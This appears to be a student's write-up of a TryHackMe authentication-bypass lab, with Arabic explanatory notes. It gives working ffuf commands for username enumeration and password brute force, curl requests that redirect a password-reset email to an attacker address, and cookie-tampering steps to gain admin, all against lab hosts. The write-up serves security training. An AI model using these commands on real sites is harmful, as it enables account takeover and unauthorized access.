# Authentication Bypass


<img width="1899" height="376" alt="image" src="https://github.com/user-attachments/assets/ccfd43f4-aa05-438f-bec0-1b69967bf785" />


---


<details>
  <summary>Username Enumeration</summary>




A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.

Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website ([http://MACHINE_IP/customers/signup](http://machine_ip/customers/signup)) signup page.

If you try entering the username **admin** and fill in the other form fields with fake information, you'll see we get the error **An account with this username already exists**. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.

Username enumeration with ffuf

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

In the above example, the `-w` argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The `-X` argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The `-d` argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to **FUZZ**. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The `-H` argument is used for adding additional headers to the request. In this instance, we're setting the `Content-Type` so the web server knows we are sending form data. The `-u` argument specifies the URL we are making the request to, and finally, the `-mr` argument is the text on the page we are looking for to validate we've found a valid username.

The ffuf tool and wordlist come pre-installed on the **AttackBox** or can be installed locally by downloading it from <https://github.com/ffuf/ffuf>.

Create a file called valid_usernames.txt and add the usernames that you found using ffuf; these will be used in Task 3.

Answer the questions below.


----

<img width="1387" height="661" alt="image" src="https://github.com/user-attachments/assets/5b793b44-0d81-45ab-aea9-e1d8012403ca" />


<img width="1633" height="458" alt="image" src="https://github.com/user-attachments/assets/fa957775-4fde-445f-bac5-95faf14b7f3d" />



  
</details>












<details>
  <summary>Brute Force</summary>


Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (<http://10.64.166.96/customers/login>).

**Note: If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.**

A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.

Bruteforcing with ffuf

```
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.64.166.96/customers/login -fc 200
```

This ffuf command is a little different to the previous one in Task 2. Previously we used the **FUZZ** keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen `W1` for our list of valid usernames and `W2` for the list of passwords we will try. The multiple wordlists are again specified with the `-w` argument but separated with a comma.  For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.


----


```
nano usernames.txt


ffuf \
-u http://10.64.166.96/customers/login \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=W1&password=W2" \
-w usernames.txt:W1 \
-w /home/kali/Downloads/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
-fc 200

```


<img width="1233" height="722" alt="image" src="https://github.com/user-attachments/assets/d1a36c26-d987-44d1-970e-9e70c2b3e2a5" />

```
steve : thunder
```






  
</details>





<details>
  <summary>Logic Flaw</summary>


**What is a Logic Flaw?**

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

<img width="917" height="404" alt="image" src="https://github.com/user-attachments/assets/ca38eef3-b228-4bea-8b89-82bec586cc94" />

**Logic Flaw Example\
**

The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.

```
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

**\
**

Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting **/adMin** will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

**Logic Flaw Practical**

We're going to examine the **Reset Password** function of the Acme IT Support website (<http://10.64.166.96/customers/reset>). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "**Account not found from supplied email address**".

For demonstration purposes, we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.

<img width="1550" height="269" alt="image" src="https://github.com/user-attachments/assets/275f774a-1f6f-4b1a-890e-49a9f2ef763d" />

At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.

Let's illustrate this by using the curl tool to manually make the request to the webserver.

**Curl Request 1:**

```
user@tryhackme$ curl 'http://10.64.166.96/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

**Curl Request 2:**

```
user@tryhackme$ curl 'http://10.64.166.96/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

<img width="1592" height="309" alt="image" src="https://github.com/user-attachments/assets/b96ed77e-3a45-42f6-a88a-0d96c72369c2" />

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of `{username}`**@customer.acmeitsupport.thm**

Now rerunning **Curl Request 2** but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

**Curl Request 2 (but using your @acmeitsupport.thm account):**

```
user@tryhackme:~$ curl 'http://10.64.166.96/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urle
```

---


<img width="1214" height="460" alt="image" src="https://github.com/user-attachments/assets/0e43f751-06bb-4a2e-b840-2aa6fd32e777" />

<img width="1181" height="442" alt="image" src="https://github.com/user-attachments/assets/1621c942-a4cd-4411-8201-8258ae4dc306" />


## ADD EMIAL 


<img width="1501" height="437" alt="image" src="https://github.com/user-attachments/assets/d965d402-03aa-4952-95ed-27ece0b1edfa" />


## let's send it to steve 

<img width="1503" height="351" alt="image" src="https://github.com/user-attachments/assets/be435f33-51ec-44cf-98a8-c51e39002fe5" />


<img width="1000" height="602" alt="image" src="https://github.com/user-attachments/assets/d03aba53-8c3a-4982-b6e2-33845be1ac4d" />


<img width="888" height="686" alt="image" src="https://github.com/user-attachments/assets/ceac1167-f63b-43ad-a654-35f58d32fcba" />

```
http://10.64.166.96/customers/reset/f691c7341a4f79627b64b3a86cf97369
```

<img width="1023" height="854" alt="image" src="https://github.com/user-attachments/assets/99dc9875-b928-49ce-a84b-42fb2b8614e1" />


<img width="814" height="479" alt="image" src="https://github.com/user-attachments/assets/5fcdc9ce-f64d-4cf0-8d51-9f405110963e" />

```
THM{AUTH_BYPASS_COMPLETE} 
```

  
</details>



<details>
  <summary>Cookie Tampering</summary>


Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the [HTTP In Detail](https://tryhackme.com/room/httpindetail) room on task 6.

**Plain Text**

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

**Set-Cookie: logged_in=true; Max-Age=3600; Path=/**\
**Set-Cookie: admin=false; Max-Age=3600; Path=/**

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:

Curl Request 1

```
user@tryhackme$ curl http://10.64.166.96/cookie-test
```

We can see we are returned a message of: **Not Logged In**

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:

Curl Request 2

```
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.64.166.96/cookie-test
```

We are given the message: **Logged In As A User**

Finally, we'll send one last request setting both the logged_in and admin cookie to true:**\
**

Curl Request 3

```
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.64.166.96/cookie-test
```

This returns the result: **Logged In As An Admin** as well as a flag which you can use to answer question one.

**Hashing**

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:



<img width="1546" height="413" alt="image" src="https://github.com/user-attachments/assets/b6d0fc01-f272-48f5-8ded-8eb9b42aa462" />





You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as <https://crackstation.net/> keep databases of billions of hashes and their original strings.

**Encoding**

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.\
Take the below data as an example which is set by the web server upon logging in:

****Set-Cookie: **session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/****\
**

This string base64 decoded has the value of **{"id":1,"admin": false}** we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.



<details>
  <summary>explain</summary>




1️⃣ يعني إيه Cookies أصلاً؟
===========================

**Cookie** = معلومة صغيرة\
السيرفر يحطها في المتصفح\
والمتصفح يبعتها مع كل Request بعد كده

🔹 السيرفر بيعتمد عليها عشان يعرف:

-   إنت عامل Login ولا لأ

-   إنت Admin ولا User

-   Session بتاعتك لسه شغالة ولا خلصت

* * * * *

2️⃣ Plain Text Cookies (أسهل نوع)
=================================

مثال:

Set-Cookie: logged_in=true\
Set-Cookie: admin=false

ده معناه حرفيًا:

-   logged_in → داخل

-   admin → مش أدمن

❌ مفيش تشفير\
❌ مفيش حماية\
❌ المبرمج واثق زيادة عن اللزوم

* * * * *

الاستغلال 🧠
------------

لو أنا بعت Request وغيّرت القيم:

curl -H "Cookie: logged_in=true; admin=true" http://target

السيرفر يقول:

> آه ده أدمن ✔️

🚨 **ده مش اختراق تقني، ده غباء برمجي**

* * * * *

3️⃣ ليه ده خطر؟
===============

لأن:

-   السيرفر **بيصدق اللي جاي من المتصفح**

-   مفيش تحقق حقيقي من الداتا

وده اسمه:

> **Client-side Authorization**

وهو من أخطر الحاجات في الدنيا

* * * * *

4️⃣ طيب لو الكوكي مش مقروءة؟ (Hash)
===================================

تلاقي Cookie كده:

session=6b86b273ff34fce19d6b804eff5a3f...

دي **Hash**

### يعني إيه Hash؟

-   تحويل قيمة لشكل ثابت

-   **مينفعش ترجعه تاني**

-   نفس المدخل → نفس الهاش دايمًا

مثال:

1 → md5 → c4ca4238a0b923820dcc509a6f75849b

* * * * *

نكسر الهاش إزاي؟
----------------

مش نكسره فعليًا\
لكن:

-   نشوف هو هاش لإيه

-   باستخدام قواعد بيانات جاهزة

زي:\
👉 crackstation.net

لو الهاش مشهور أو بسيط:

> هتلاقي القيمة الأصلية بسهولة

* * * * *

5️⃣ Encoding (أخطر من الهاش)
============================

مثال:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==

دي مش هاش ❌\
دي **Base64 Encoding** ✅

* * * * *

نفكها:
------

eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==\
↓ base64 decode\
{"id":1,"admin":false}

😳 يعني الكوكي حرفيًا JSON

* * * * *

الاستغلال 😈
------------

1.  نفك Base64

2.  نغير:

"admin": false → true

1.  نعمل Base64 Encode تاني

2.  نحطها في الكوكي

🚀 مبروك بقيت Admin

* * * * *

6️⃣ الفرق المهم (احفظه كويس)
============================

| النوع | ينفع نرجعه؟ | نعدله؟ | خطورته |
| --- | --- | --- | --- |
| Plain Text | آه | آه | عالي |
| Hash | لأ | لا مباشرة | متوسط |
| Encoding | آه | آه | عالي جدًا |



  
</details>






<img width="1375" height="469" alt="image" src="https://github.com/user-attachments/assets/671d3751-b791-4cb7-bc0c-da0ea8fc22cf" />

<img width="445" height="490" alt="image" src="https://github.com/user-attachments/assets/6e7727ac-ab6b-4502-ba10-d230de90313c" />

<img width="1674" height="568" alt="image" src="https://github.com/user-attachments/assets/721c450d-3146-4e1b-87c7-9f69962cde53" />


<img width="1719" height="312" alt="image" src="https://github.com/user-attachments/assets/b0afe44f-08b1-40dc-bf8b-25b1bd89778a" />









  
</details>


















































